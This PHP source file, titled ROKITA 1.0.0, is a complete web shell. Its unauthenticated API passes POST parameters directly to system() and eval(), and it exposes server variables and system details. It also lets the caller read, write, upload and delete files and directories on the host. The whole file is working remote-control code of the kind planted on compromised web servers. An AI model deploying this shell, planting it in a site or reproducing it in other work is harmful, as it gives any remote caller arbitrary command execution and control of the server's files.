<?php
	/*
	ROKITA 1.0.0
	by Sarverott 2018
	MIT Licence
	*/
	function is_ass($arr){
    if(array()===$arr)return false;
    return array_keys($arr)!==range(0,count($arr)-1);
  }
  function extra_json_encode($arr){
    //var_dump(gettype($arr));
    switch(gettype($arr)){
        case "string":
          return '"'.addslashes($arr).'"';
        break;
        case "boolean":
          if($arr){
            return "true";
          }else{
            return "false";
          }
        break;
        case "array":
          if(is_ass($arr)){
            $tmp="{";
              $first=true;
            foreach($arr as $k=>$v){
              if(!$first){
                $tmp.=",";
              }else{
                $first=false;
              }
              $tmp.='"'.addslashes($k).'":'.extra_json_encode($v);
            }
            $tmp.="}";
            return $tmp;
          }else{
            $tmp="[";
            $first=true;
            foreach($arr as $v){
              if(!$first){
                $tmp.=",";
              }else{
                $first=false;
              }
              $tmp.=extra_json_encode($v);
            }
            $tmp.="]";
            return $tmp;
          }
        break;
        case "number":
          return $arr;
        break;
    }
  }
	class sys_procesor{
    public function execute($command){
      //$out=[];
      //$ret=0;
      //exec($command, $out, $ret);
      //return implode("\n",$out);
      system($command);
    }
    public function evaluate($code){
      eval($code);
    }
    public function server_vars(){
      return json_encode($_SERVER);
    }
    public function system_details(){
      return json_encode([
        "uname"=>php_uname()
      ]);
    }
    public function base_path(){
      $tmp=$_SERVER['SCRIPT_FILENAME'];
      $tmp=str_replace("/", "\\", $tmp);
      //var_dump($tmp);
      $tmp=substr($tmp, 0, strrpos($tmp, "\\"));
      return json_encode([
        "path"=>$tmp
      ]);
    }
  }
	class path_procesor{
	  public $path;
	  public function __construct($path){
	    if(!trim($path)) throw new Exception("path_empty");
	    $this->path=$path;
	  }
	  public function __destruct(){
	    //
	  }
	}
	class dir_procesor extends path_procesor{
	  //public function __toString(){

	  public function details(){
	    //var_dump($this->path);
	    if(!file_exists($this->path)) throw new Exception("dir_not_exist (".$this->path.")");
	    if(!is_dir($this->path)) throw new Exception("path_to_nondir_object");
	    $ttt=opendir($this->path);
	    //var_dump($ttt);
			$directories=[];
			$files=[];
			$current=false;
			$up=false;
			while($file=readdir($ttt)){
	      //var_dump($file);
				if($file==".."){
					$up=true;
				}elseif($file=="."){
					$current=true;
				}else{
					if(is_dir($this->path."\\".$file)){
						$directories[]=$file;
					}else{
						$files[]=$file;
					}
				}
			}
			closedir($ttt);
	    /*extra_json_encode([
	      "path"=>$this->path,
	      "content"=>[
	        "directories"=>$directories,
	        "files"=>$files,
	        "current"=>$current,
	        "up"=>$up
	      ]
	    ]);*/
	    return extra_json_encode([
	      "path"=>$this->path,
	      "content"=>[
	        "directories"=>$directories,
	        "files"=>$files,
	        "current"=>$current,
	        "up"=>$up
	      ]
	    ], 0, 2048);
	  }
	  public function create(){
	    mkdir($this->path);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	  public function delete(){
	    rmdir($this->path);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	}
	class file_procesor extends path_procesor{
	  public function read(){
	    if(!file_exists($this->path)) throw "file_not_exist";
	    if(!is_file($this->path)) throw "path_to_nonfile_object";
	    return json_encode([
	      "path"=>$this->path,
	      "content"=>implode(
	        file($this->path),
	        ""
	      )
	    ]);
	  }
	  public function write($content){
	    $f=fopen($this->path, "w");
	    fwrite($f, $content);
	    fclose($f);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	  public function append($content){
	    $f=fopen($this->path, "a+");
	    fwrite($f, $content);
	    fclose($f);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	  public function upload($file){
	    if(move_uploaded_file($file["tmp_name"],$this->path.basename($file["name"]))) {
	      return json_encode([
	        "path"=>$this->path,
	        "status"=>"ok"
	      ]);
	    }else{
	      return json_encode([
	        "path"=>$this->path,
	        "status"=>"error"
	      ]);
	    }
	  }
	  public function create(){
	    touch($this->path);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	  public function delete(){
	    unlink($this->path);
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"ok"
	    ]);
	  }
	  //public function __toString(){
	  public function details(){
	    return json_encode([
	      "path"=>$this->path,
	      "status"=>"exist",
	      "type"=>"file",
	      "filesize"=>filesize($this->path),
	      "mime"=>mime_content_type($this->path),
	      "md5"=>md5_file($this->path),
	      "modifyed"=>filemtime($this->path)
	    ]);
	  }
	}
	function json_output($content){
    header("Content-type: aplication/json");
    echo $content;
    die();
  }
  if(isset($_GET['api'])){
    switch($_GET['command']){
      case "system":
        $tmp=new sys_procesor();
        switch($_GET['action']){
          case "execute":
            $tmp->execute($_POST['arguments0']);
            die();
          break;
          case "evaluate":
            $tmp->evaluate($_POST['arguments0']);
            die();
          break;
          case "server_vars":
            json_output($tmp->server_vars());
          break;
          case "system_details":
            json_output($tmp->system_details());
          break;
          case "base_path":
            json_output($tmp->base_path());
          break;
        }
      break;
      case "file":
        $tmp=new file_procesor($_POST['arguments0']);
        switch($_GET['action']){
          case "upload":
            echo $tmp->upload($_FILES['uploaded']);
            die();
          break;
          case "read":
            json_output($tmp->read());
          break;
          case "write":
            json_output($tmp->write($_POST['arguments1']));
          break;
          case "append":
            json_output($tmp->append($_POST['arguments1']));
          break;
          case "delete":
            json_output($tmp->delete());
          break;
          case "create":
            json_output($tmp->create());
          break;
          case "details":
            //json_output((String)$tmp);
            json_output($tmp->details());
          break;
        }
      break;
      case "directory":
        //var_dump($_POST['arguments0']);
        $tmp=new dir_procesor($_POST['arguments0']);
        switch($_GET['action']){
          case "ls":
            //json_output((String)$tmp);
            json_output($tmp->details());
          break;
          case "delete":
            json_output($tmp->delete());
          break;
          case "create":
            json_output($tmp->create());
          break;
        }
        break;
    }
  }
?>
